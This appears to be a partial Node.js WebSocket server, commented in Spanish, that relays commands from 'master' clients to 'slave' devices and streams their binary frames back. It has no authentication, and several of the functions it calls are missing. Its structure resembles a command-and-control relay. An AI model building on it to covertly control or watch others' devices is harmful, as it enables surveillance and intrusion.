const http = require('http');
const WebSocket = require('ws');

const server = http.createServer((req, res) => {
    res.writeHead(200);
    res.end('🚀 Remote Control v6.0 - Conexión Estable 🚀');
});

const wss = new WebSocket.Server({ server });

const devices = {
    slaves: new Map(),
    masters: new Set(),
    streams: new Set() // Nuevo: Para trackear streams activos
};

// ================== FUNCIONES AUXILIARES ==================
function isJSON(str) {
    try {
        JSON.parse(str);
        return true;
    } catch (e) {
        return false;
    }
}

function cleanDisconnectedSlaves() {
    devices.slaves.forEach((ws, slaveId) => {
        if (ws.readyState !== WebSocket.OPEN) {
            devices.slaves.delete(slaveId);
            console.log(`[CLEANUP] Esclavo ${slaveId} eliminado`);
        }
    });
}

// ================== MANEJO DE CONEXIONES ==================
wss.on('connection', (ws, req) => {
    const ip = req.socket.remoteAddress;
    console.log(`[+] Conexión desde: ${ip}`);

    ws.on('message', (message, isBinary) => { // Modificado para soportar binario
        try {
            if (isBinary) {
                handleBinaryMessage(message, ws);
            } else {
                const msg = message.toString();
                console.log(`[${ip}] Mensaje recibido: ${msg}`);

                if (isJSON(msg)) {
                    const data = JSON.parse(msg);
                    handleJSONMessage(data, ws);
                } else {
                    handleTextMessage(ws, msg);
                }
            }
        } catch (e) {
            console.error(`[ERROR] ${ip}: ${e.message}`);
        }
    });

    ws.on('close', () => {
        cleanupDisconnected(ws);
        console.log(`[-] ${ip} desconectado`);
    });
});

// ================== MANEJO DE BINARIOS (STREAMING) ==================
function handleBinaryMessage(frame, ws) {
    const slaveEntry = Array.from(devices.slaves).find(([id, socket]) => socket === ws);
    if (slaveEntry) {
        const [slaveId] = slaveEntry;
        broadcastFrameToMasters(frame, slaveId);
    }
}

function broadcastFrameToMasters(frame, slaveId) {
    const header = Buffer.alloc(4);
    header.writeUInt32BE(slaveId.length, 0);
    
    const packet = Buffer.concat([
        header,
        Buffer.from(slaveId),
        frame
    ]);
    
    devices.masters.forEach(master => {
        if (master.readyState === WebSocket.OPEN) {
            master.send(packet, { binary: true });
        }
    });
}

// ================== MANEJO DE MENSAJES ACTUALIZADO ==================
function handleJSONMessage(data, ws) {
    switch(data.action) {
        case 'command':
            if (data.target && data.command) {
                console.log(`[COMMAND] Comando ${data.command} para ${data.target}`);
                sendCommandToSlave(data.target, data.command);
            }
            break;
            
        case 'confirmation':
            const slaveEntry = Array.from(devices.slaves).find(([id, socket]) => socket === ws);
            const slaveId = slaveEntry ? slaveEntry[0] : 'Desconocido';
            console.log(`[CONFIRM] ${slaveId} confirmó comando: ${data.command} (Estado: ${data.status})`);
            break;
            
        case 'start_stream': // Nuevo comando
            if (data.target) {
                console.log(`[STREAM] Iniciando transmisión de ${data.target}`);
                devices.streams.add(data.target);
                sendCommandToSlave(data.target, 'START_STREAM');
            }
            break;
            
        case 'stop_stream': // Nuevo comando
            if (data.target) {
                console.log(`[STREAM] Deteniendo transmisión de ${data.target}`);
                devices.streams.delete(data.target);
                sendCommandToSlave(data.target, 'STOP_STREAM');
            }
            break;
            
        default:
            console.log(`[ACTION DESCONOCIDA] ${JSON.stringify(data)}`);
    }
}

// ================== FUNCIONES PRINCIPALES MODIFICADAS ==================
function cleanupDisconnected(ws) {
    // Notificar a masters si un esclavo en streaming se desconecta
    devices.slaves.forEach((value, key) => {
        if (value === ws && devices.streams.has(key)) {
            devices.masters.forEach(master => {
                master.send(JSON.stringify({
                    action: "stream_end",
                    slaveId: key,
                    reason: "disconnected"
                }));
            });
            devices.streams.delete(key);
        }
    });
    
    // Resto de la lógica original...
    devices.slaves.forEach((value, key) => {
        if (value === ws) {
            devices.slaves.delete(key);
            console.log(`[CLEANUP] Esclavo ${key} eliminado`);
        }
    });
    
    if (devices.masters.has(ws)) {
        devices.masters.delete(ws);
        console.log('[CLEANUP] Master eliminado');
    }
    
    broadcastSlaves();
}

// Resto del código se mantiene igual...

// ================== INICIAR SERVIDOR ==================
const port = process.env.PORT || 8080;
server.listen(port, () => {
    console.log(`✅ Servidor ACTIVO en puerto: ${port}`);
    console.log(`🔥 Modo streaming habilitado`);
});
